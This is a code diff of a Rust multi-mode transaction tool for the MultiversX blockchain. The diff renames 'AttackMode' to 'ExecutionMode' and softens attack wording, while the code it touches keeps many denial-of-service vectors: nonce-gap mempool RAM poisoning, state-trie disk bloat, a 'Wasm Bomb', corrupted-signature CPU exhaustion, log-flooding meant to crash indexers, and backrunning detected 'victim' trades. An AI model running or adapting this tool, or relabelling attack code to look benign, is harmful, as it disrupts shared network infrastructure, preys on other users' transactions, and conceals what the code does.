@@ -26,15 +26,15 @@ use clap::{Parser, ValueEnum};
 #[derive(Parser, Debug)]
 #[command(author, version, about = "XCron Keeper Protocol Multi-Role Node", long_about = None)]
 pub struct Cli {
-    /// The attack or operation mode to execute
+    /// The execution or operation mode to execute
     #[arg(short, long, value_enum)]
-    pub mode: AttackMode,
+    pub mode: ExecutionMode,
 
     /// Number of concurrent background broadcasters (HTTP Network Threads)
     #[arg(long, default_value_t = 2000)]
     pub broadcasters: usize,
 
-    /// Sleep interval between Snipe attacks in seconds
+    /// Sleep interval between Snipe operations in seconds
     #[arg(long, default_value_t = 1)]
     pub snipe_interval_sec: u64,
 
@@ -54,9 +54,9 @@ pub struct Cli {
     #[arg(long, default_value_t = 0)]
     pub wallets: usize,
 
-    /// Mixed attack mode: injects +5 nonce gaps (RAM poisoning) alongside valid TPS
+    /// Mixed execution mode: injects +5 nonce gaps (RAM poisoning) alongside valid TPS
     #[arg(long, default_value_t = false)]
-    pub mixed_attack: bool,
+    pub mixed_profile: bool,
 
     /// Gateway/API URL to target (default: dedicated German VPS)
     #[arg(long, default_value = "http://5.189.152.86:8080")]
@@ -80,7 +80,7 @@ pub struct Cli {
 }
 
 #[derive(Debug, Clone, Copy, PartialEq, ValueEnum)]
-pub enum AttackMode {
+pub enum ExecutionMode {
     /// Maniobra A: Inundar con carga pre-calculada para quemar RAM poco a poco.
     PreWarm,
     /// Maniobra B: Micro-Bursting de silencio absoluto y ráfagas letales en la ventana PBFT.
@@ -189,7 +189,7 @@ fn generate_fuzzing_payload() -> Vec<u8> {
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let cli = Cli::parse();
     
-    if cli.mode == AttackMode::XseSim {
+    if cli.mode == ExecutionMode::XseSim {
         use dispatcher::{ExecutionTask, SettlementDispatcher, AIAgentDispatcher};
         
         println!("==================================================");
@@ -284,7 +284,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     }
     
     if wallets.is_empty() {
-        return Err("No wallets found. Cannot attack without weapons.".into());
+        return Err("No wallets found. Cannot execute without funded wallets.".into());
     }
 
     // Limit wallets if --wallets flag is set
@@ -293,7 +293,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         println!("🎯 Using {} wallets (limited by --wallets flag)", wallets.len());
     }
 
-    if cli.mode == AttackMode::ArbitrageHft || cli.mode == AttackMode::EventKeeper {
+    if cli.mode == ExecutionMode::ArbitrageHft || cli.mode == ExecutionMode::EventKeeper {
         wallets.truncate(1);
         println!("🦅 [xCron HFT / EventKeeper] Usando solo 1 Master Wallet. Omitiendo sincronización de 10.000 carteras.");
     }
@@ -402,7 +402,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     // Transctions are now broadcast directly from the wallet loops below.
     let mut handles = vec![];
 
-    if cli.mode == AttackMode::EventKeeper {
+    if cli.mode == ExecutionMode::EventKeeper {
         println!("🚀 Iniciando Infraestructura Agéntica: State & Event Driven Mode");
         let sample_tasks = vec![
             event_engine::InternalTriggerMetadata::EventDriven {
@@ -425,7 +425,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         return Ok(());
     }
 
-    if cli.mode == AttackMode::FundHydra {
+    if cli.mode == ExecutionMode::FundHydra {
         println!("💸 FUNDING HYDRA WALLETS MODE ENGAGED 💸");
         let parent = KeeperWallet::load_pem(if std::path::Path::new("./.secrets/wallet.pem").exists() { "./.secrets/wallet.pem" } else { "../.secrets/wallet.pem" }).expect("needs wallet.pem");
         let mut parent_nonce = network.fetch_nonce(&parent.bech32_address).await.unwrap_or(0);
@@ -458,7 +458,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     // --- PRODUCERS (The Waiters taking orders) ---
     // The Surgical Sniper Watch Channel
     let (sniper_tx, sniper_rx) = tokio::sync::watch::channel(None::<mempool_sniper::VictimDetected>);
-    if cli.mode == AttackMode::SurgicalBackrun {
+    if cli.mode == ExecutionMode::SurgicalBackrun {
         let obs_url = cli.gateway.clone();
         let target_dex = cli.dex_pair.clone();
         let sniper_tx_clone = sniper_tx.clone();
@@ -474,7 +474,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     // The HFT Arbitrage Watch Channel
     let (arb_tx, arb_rx) = tokio::sync::watch::channel(None::<ws_sniper::ArbitrageOpportunity>);
-    if cli.mode == AttackMode::ArbitrageHft {
+    if cli.mode == ExecutionMode::ArbitrageHft {
         let obs_url = "ws://5.189.152.86:8080/mempool".to_string(); // Tu VPS
         let target_dexes: std::collections::HashSet<String> = vec![
             "erd1qqqqqqqqqqqqqpgqeel2kumf0r8ffyhth7pqdujjat9nx0862jpsg2pqaq".to_string(), // xExchange WEGLD/USDC
@@ -509,7 +509,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         let snipe_interval = cli.snipe_interval_sec;
         let snipe_window = cli.snipe_window_ms;
         let cli_tps = cli.tps;
-        let mixed_attack = cli.mixed_attack;
+        let mixed_profile = cli.mixed_profile;
         let chain_id_for_tx = cli.chain_id.clone();
         let shared_addresses_clone = Arc::clone(&shared_addresses);
         
@@ -524,18 +524,18 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
             loop {
                 match mode_clone {
-                    AttackMode::TpsDemo => {
+                    ExecutionMode::TpsDemo => {
                         // TpsDemo runs completely unhinged now. Zero sleep.
                     },
-                    AttackMode::XseSim | AttackMode::PreWarm | AttackMode::Stress | AttackMode::MultiKeeper | AttackMode::Fuzz | AttackMode::IntraShard | AttackMode::FundHydra | AttackMode::WrapEgld | AttackMode::DexSwap | AttackMode::CrossShard | AttackMode::RelayedCrossShard | AttackMode::RelayedDex | AttackMode::XcronSwarm | AttackMode::Zeta | AttackMode::Theta | AttackMode::Epsilon | AttackMode::Delta | AttackMode::XcronBoundary | AttackMode::StateDesync | AttackMode::EieOverflow | AttackMode::NonceDesyncV2 | AttackMode::BlsDesync | AttackMode::OrphanFlooding | AttackMode::SurgicalBackrun | AttackMode::ArbitrageHft | AttackMode::PcitDemo | AttackMode::EventKeeper | AttackMode::E2EBenchmark => {
+                    ExecutionMode::XseSim | ExecutionMode::PreWarm | ExecutionMode::Stress | ExecutionMode::MultiKeeper | ExecutionMode::Fuzz | ExecutionMode::IntraShard | ExecutionMode::FundHydra | ExecutionMode::WrapEgld | ExecutionMode::DexSwap | ExecutionMode::CrossShard | ExecutionMode::RelayedCrossShard | ExecutionMode::RelayedDex | ExecutionMode::XcronSwarm | ExecutionMode::Zeta | ExecutionMode::Theta | ExecutionMode::Epsilon | ExecutionMode::Delta | ExecutionMode::XcronBoundary | ExecutionMode::StateDesync | ExecutionMode::EieOverflow | ExecutionMode::NonceDesyncV2 | ExecutionMode::BlsDesync | ExecutionMode::OrphanFlooding | ExecutionMode::SurgicalBackrun | ExecutionMode::ArbitrageHft | ExecutionMode::PcitDemo | ExecutionMode::EventKeeper | ExecutionMode::E2EBenchmark => {
                         // All these modes disparan continuamente a los Gateways sin parar, 
                         // guiados solo por el TPS total configurado. (SurgicalBackrun/ArbitrageHft lo ignoran dentro de su logic)
-                        if cli.mode != AttackMode::SurgicalBackrun && cli.mode != AttackMode::ArbitrageHft {
+                        if cli.mode != ExecutionMode::SurgicalBackrun && cli.mode != ExecutionMode::ArbitrageHft {
                             let delay = Duration::from_micros((1_000_000 * num_active_wallets) / cli_tps as u64);
                             sleep(delay).await;
                         }
                     },
-                    AttackMode::Snipe => {
+                    ExecutionMode::Snipe => {
                         // El Asalto de Precisión (Snipe) y la Bomba Wasm (Epsilon) evaden P2P
                         // aplicando un Jitter Silencioso. Ningún tx sale durante minutos.
                         // Todo sale de golpe en la ventana letal de 42ms (PBFT Time)
@@ -620,8 +620,8 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 let roll: u8 = rand::random::<u8>() % 100;
                 
                 let (payload, gas, receiver_owned, value) = match mode_clone {
-                    AttackMode::XseSim => (None, 0, KeeperWallet::generate_random_address(), "0"),
-                    AttackMode::Stress => {
+                    ExecutionMode::XseSim => (None, 0, KeeperWallet::generate_random_address(), "0"),
+                    ExecutionMode::Stress => {
                         // Vector Gamma: Storage IO State Bloat (Kill the NVMe Disks)
                         // By firing 50KB blocks to the state trie continuously to the same SC,
                         // we bottleneck the nodes physically on disk IO, trying to breach 6s Block Time.
@@ -629,7 +629,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                         let target_sc = "erd1qqqqqqqqqqqqqpgqpng9zskcp3ng6pvk5gz6rx4asd2rcrvpa9kqw9aaxe".to_string(); // The actual deployed SC on BoN
                         (Some(pl), 300_000_000, target_sc, "0")
                     },
-                    AttackMode::Fuzz => {
+                    ExecutionMode::Fuzz => {
                         // Vector Beta: Mempool Orphan Poisoning ("Ghost Tx")
                         // We intentionally skip a nonce to force the Gateway to hold the subsequent valid transactions in RAM
                         // waiting for the missing sequence number. At 100 wallets * 50 TPS, this fills up the Orphan pool rapidly.
@@ -637,24 +637,24 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                         // We do a simple valid EGLD transfer so it's accepted mathematically, but sequence-poisoned.
                         (None, 50_000, KeeperWallet::generate_random_address(), "1")
                     },
-                    AttackMode::IntraShard => {
+                    ExecutionMode::IntraShard => {
                         // Window A: MoveBalance to random challenge address in same shard
                         let rand_idx: usize = rand::random::<usize>() % shared_addresses_clone.len();
                         (None, 50_000, shared_addresses_clone[rand_idx].clone(), "1")
                     },
-                    AttackMode::WrapEgld => {
+                    ExecutionMode::WrapEgld => {
                         // Window B step 1: Wrap EGLD to WEGLD using system SC
                         // Need 0.005 EGLD minimum for 1,000 swaps in total across the bot limit
                         let pl = b"wrapEgld".to_vec();
                         (Some(pl), 5_000_000, "erd1qqqqqqqqqqqqqqqpqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqzllls8a5w6u".to_string(), "5000000000000000") // 0.005 EGLD
                     },
-                    AttackMode::DexSwap => {
+                    ExecutionMode::DexSwap => {
                         // Window B step 2: 15M Gas Swap WEGLD to USDC
                         let payload_str = "ESDTTransfer@5745474c442d626434643739@01@73776170546f6b656e734669786564496e707574@555344432d633736663166@01";
                         let pl = payload_str.as_bytes().to_vec();
                         (Some(pl), 15_000_000, "erd1qqqqqqqqqqqqqpgqeel2kumf0r8ffyhth7pqdujjat9nx0862jpsg2pqaq".to_string(), "0")
                     },
-                    AttackMode::CrossShard => {
+                    ExecutionMode::CrossShard => {
                         // Vector Alpha: The Boomerang (Cross-Shard Congestion)
                         // Firing from ALL Shards (Sender) -> Targeting Shard 1 (XCron Contract) -> Cross-Calling to Shard 2 Data State
                         // This forces routing Miniblocks to handle a massive 3-point geometry spike.
@@ -686,7 +686,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                         // Cost in EGLD: ~0.003 EGLD per tx -> Total for 5000 txs is just 15 EGLD.
                         (Some(pl), 6_000_000, receiver, "0")
                     },
-                    AttackMode::RelayedCrossShard => {
+                    ExecutionMode::RelayedCrossShard => {
                         // Window D: Relayed cross-shard MoveBalance
                         // Build inner TX, sign it, wrap in relayedTx@
                         let sender_shard = KeeperWallet::get_shard(&wallet_clone.bech32_address, 3);
@@ -701,7 +701,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                         // Relayed TX: sender = relayer (same wallet), receiver = inner sender
                         (Some(pl), 12_000_000, wallet_clone.bech32_address.clone(), "0")
                     },
-                    AttackMode::RelayedDex => {
+                    ExecutionMode::RelayedDex => {
                         // Window E: Relayed DEX swap
                         let dex_payload_str = "ESDTTransfer@5745474c442d626434643739@01@73776170546f6b656e734669786564496e707574@555344432d633736663166@01";
                         let mut inner_tx = Transaction::new(
@@ -716,7 +716,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                         let pl = relayed_data.into_bytes();
                         (Some(pl), 30_000_000, wallet_clone.bech32_address.clone(), "0")
                     },
-                    AttackMode::XcronSwarm => {
+                    ExecutionMode::XcronSwarm => {
                         // Devnet 6-Second Block Optimization: 90% Creators (9k) / 10% Keepers (1k)
                         let is_creator = i % 10 != 0;
                         if is_creator {
@@ -743,8 +743,8 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                             (Some(payload_str.into_bytes()), 6_000_000, "erd1qqqqqqqqqqqqqpgqazq2ztyyfjxgejwp0fv3xltp9xhsw9yga9kqnufeat".to_string(), "0")
                         }
                     },
-                    AttackMode::XcronBoundary => {
-                        // BLOCK BOUNDARY ATTACK: Fire at the exact edge of block close/open
+                    ExecutionMode::XcronBoundary => {
+                        // BLOCK BOUNDARY EXECUTION: Fire at the exact edge of block close/open
                         // Strategy: Use block timestamp to determine position within 6s block cycle
                         // Last 20ms -> scheduleTask (creates task at boundary)
                         // First 20ms -> executeTask (races to execute before state confirms)
@@ -789,17 +789,17 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                             continue;
                         }
                     },
-                    AttackMode::FundHydra => {
+                    ExecutionMode::FundHydra => {
                         let target = addrs[(current_nonce as usize + i) % 100].to_string();
                         (None, 50_000, target, "200000000000000000")
                     },
-                    AttackMode::Zeta => {
+                    ExecutionMode::Zeta => {
                         // Vector Zeta: Account State Dusting
                         // Send 1 Wei (or 0) to a completely random new address to force the network to create a new node in the State Trie.
                         let encoded_target = KeeperWallet::generate_random_address();
                         (None, 50_000, encoded_target, "1")
                     },
-                    AttackMode::Theta => {
+                    ExecutionMode::Theta => {
                         // Vector Theta: Cross-Shard Receipt Header Bloat
                         // Send a payload to a non-existent endpoint on a different shard.
                         // The destination shard will fail it and send a massive "receipt" back to the sender shard.
@@ -813,7 +813,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                         let target_sc = "erd1qqqqqqqqqqqqqqqpqqqqqqqqqqqqqqqqqqqqqqqqqqqqp3lllllsn4e83q".to_string();
                         (Some(garbage.into_bytes()), 10_000_000, target_sc, "0")
                     },
-                    AttackMode::Epsilon => {
+                    ExecutionMode::Epsilon => {
                         // Supernova Vector 6: The Wasm Bomb (Application Layer PBFT Strike)
                         // Destructive force: Deep recursive parsing inside the MultiversX VM.
                         // We bypass external P2P rate limits because the transaction payload size is small,
@@ -832,7 +832,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                         // to pause for hundreds of milliseconds while allocating VM instances.
                         (Some(garbage.into_bytes()), 50_000_000, target_sc, "0")
                     },
-                    AttackMode::Delta => {
+                    ExecutionMode::Delta => {
                         // Vector Delta: Event Log Saturation (ElasticSearch Crash)
                         // By calling an endpoint that emits logs or by padding a transaction with excess event-like data
                         let payload_size = 500;
@@ -844,7 +844,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                         let target_sc = "erd1qqqqqqqqqqqqqqqpqqqqqqqqqqqqqqqqqqqqqqqqqqqqp3lllllsn4e83q".to_string();
                         (Some(garbage.into_bytes()), 12_000_000, target_sc, "0")
                     },
-                    AttackMode::StateDesync => {
+                    ExecutionMode::StateDesync => {
                         // Supernova Vector 1: State Desync
                         // Fire a complex contract call specifically crossing shards asynchronously right at the PBFT consensus boundary.
                         // We target the SC to schedule a task that edits deep state elements (forcing cross-shard trie updates).
@@ -869,7 +869,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                         let receiver = "erd1qqqqqqqqqqqqqpgqazq2ztyyfjxgejwp0fv3xltp9xhsw9yga9kqnufeat".to_string(); // SC Address
                         (Some(payload_str.into_bytes()), 80_000_000, receiver, "0")
                     },
-                    AttackMode::EieOverflow => {
+                    ExecutionMode::EieOverflow => {
                         // Supernova Vector 2: EIE Overflow
                         // Create massive backpressure by deploying unoptimized calls that require deep VM execution
                         // intertwined with asynchronous callbacks that never resolve.
@@ -881,7 +881,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                         let target_sc = "erd1qqqqqqqqqqqqqqqpqqqqqqqqqqqqqqqqqqqqqqqqqqqqp3lllllsn4e83q".to_string();
                         (Some(garbage.into_bytes()), 25_000_000, target_sc, "0")
                     },
-                    AttackMode::NonceDesyncV2 => {
+                    ExecutionMode::NonceDesyncV2 => {
                         // Supernova Vector 3: Nonce Desync V2
                         // Utilizing the relayed Tx mechanic to force async execution while the original sender's nonce is held hostage.
                         // We wrap a valid transaction but point to a Relayer that doesn't have funds or has state lock.
@@ -897,7 +897,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                         let pl = relayed_data.into_bytes();
                         (Some(pl), 15_000_000, wallet_clone.bech32_address.clone(), "0")
                     },
-                    AttackMode::BlsDesync => {
+                    ExecutionMode::BlsDesync => {
                         // Supernova Vector 4: BLS Signature Desync (Asymmetric CPU Exhaustion)
                         // This payload is lightweight but we will corrupt the ED25519 signature before broadcast.
                         // Waiters will accept the P2P message, but Validators will burn expensive CPU cycles
@@ -906,7 +906,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                         let receiver = KeeperWallet::generate_cross_shard_address(sender_shard, 3);
                         (None, 50_000, receiver, "1000000000000000") // 0.001 EGLD
                     },
-                    AttackMode::OrphanFlooding => {
+                    ExecutionMode::OrphanFlooding => {
                         // Supernova Vector 5: Cross-Shard Orphan Flooding (RAM Exhaustion)
                         // Send cross-shard transactions with nonces intentionally gapped (N+2 to N+100),
                         // forcing the receiving Shard Mempool to allocate RAM for them indefinitely until N arrives.
@@ -914,11 +914,11 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                         let receiver = KeeperWallet::generate_cross_shard_address(sender_shard, 3);
                         (None, 50_000, receiver, "1000000000000000") // 0.001 EGLD
                     },
-                    AttackMode::TpsDemo => {
+                    ExecutionMode::TpsDemo => {
                         // High TPS Demonstration: Valid EGLD transfer with XCronProtocol signature
                         (Some(b"XCronProtocol".to_vec()), 100_000, wallet_clone.bech32_address.clone(), "1")
                     },
-                    AttackMode::E2EBenchmark => {
+                    ExecutionMode::E2EBenchmark => {
                         let step = current_nonce % 4;
                         match step {
                             0 => {
@@ -943,10 +943,10 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                             }
                         }
                     },
-                    AttackMode::EventKeeper => {
+                    ExecutionMode::EventKeeper => {
                         (None, 50_000, wallet_clone.bech32_address.clone(), "0")
                     },
-                    AttackMode::PcitDemo => {
+                    ExecutionMode::PcitDemo => {
                         // 1. Emulate AI dynamically picking a branch based on High-Frequency Telemetry
                         let target_sc_addr_hex = "00000000000000000500ebaa4de200cf54fe97a0604c759cd8f6de251daeb90b"; // Target DEX
                         let mut target_sc_bytes = [0u8; 32];
@@ -985,7 +985,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                         
                         (Some(payload_bytes), 30_000_000, "erd1qqqqqqqqqqqqqpgqazq2ztyyfjxgejwp0fv3xltp9xhsw9yga9kqnufeat".to_string(), "0")
                     },
-                    AttackMode::SurgicalBackrun => {
+                    ExecutionMode::SurgicalBackrun => {
                         let mut victim_detected = None;
 
                         // Block until the sniper detects a victim
@@ -1032,7 +1032,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                             continue;
                         }
                     },
-                    AttackMode::ArbitrageHft => {
+                    ExecutionMode::ArbitrageHft => {
                         let mut trigger_opp = None;
 
                         // Block until the WS Sniper detects an Arbitrage Opportunity
@@ -1147,7 +1147,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 );
                 
                 // Override gas price for SurgicalBackrun to perfectly match the victim
-                if matches!(mode_clone, AttackMode::SurgicalBackrun) {
+                if matches!(mode_clone, ExecutionMode::SurgicalBackrun) {
                     if let Some(v) = sniper_rx_clone.borrow().clone() {
                         tx.gas_price = v.gas_price;
                     }
@@ -1155,9 +1155,9 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 
                 // Vector Beta: Orphan Poisoning Logic
                 // If we are in Fuzz mode or OrphanFlooding, we intentionally SKIP nonces dynamically to poison the Mempool RAM
-                if matches!(mode_clone, AttackMode::Fuzz) || matches!(mode_clone, AttackMode::OrphanFlooding) {
+                if matches!(mode_clone, ExecutionMode::Fuzz) || matches!(mode_clone, ExecutionMode::OrphanFlooding) {
                     // For OrphanFlooding, we ALWAYS skip the nonce and target cross-shard destinations unconditionally.
-                    if matches!(mode_clone, AttackMode::OrphanFlooding) {
+                    if matches!(mode_clone, ExecutionMode::OrphanFlooding) {
                         tx.nonce = current_nonce + 5 + (i as u64 % 50); // Massive gaps filling receiving Shard RAM
                     } else {
                         // 10% chance to skip ahead by 5 nonces in Fuzz Mode
@@ -1168,7 +1168,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                     }
                 }
 
-                if matches!(mode_clone, AttackMode::FundHydra) {
+                if matches!(mode_clone, ExecutionMode::FundHydra) {
                     for j in 0..100 {
                         // In FundHydra mode, loop locally to generate all 100 funding txs
                         let current_nonce_fund = nonce_clone.fetch_add(1, Ordering::SeqCst);
@@ -1190,7 +1190,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                     }
                     // Terminate the thread for this wallet since all 100 are queued
                     break;
-                } else if matches!(mode_clone, AttackMode::BlsDesync) {
+                } else if matches!(mode_clone, ExecutionMode::BlsDesync) {
                     // Vector 4: Deliberately corrupt the signature before sending to waste PBFT Validation CPU
                     if tx.sign_and_corrupt(&wallet_clone.signing_key).is_ok() {
                         let _ = network_clone.broadcast_tx(&tx).await;
@@ -1240,7 +1240,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 }
                 
                 // Yield the loop to the Tokio executor so the spawned tasks can actually run
-                if !matches!(mode_clone, AttackMode::TpsDemo) {
+                if !matches!(mode_clone, ExecutionMode::TpsDemo) {
                     tokio::time::sleep(std::time::Duration::from_millis(300)).await;
                 } else {
                     // Wait between TXs per wallet to respect TPS limit
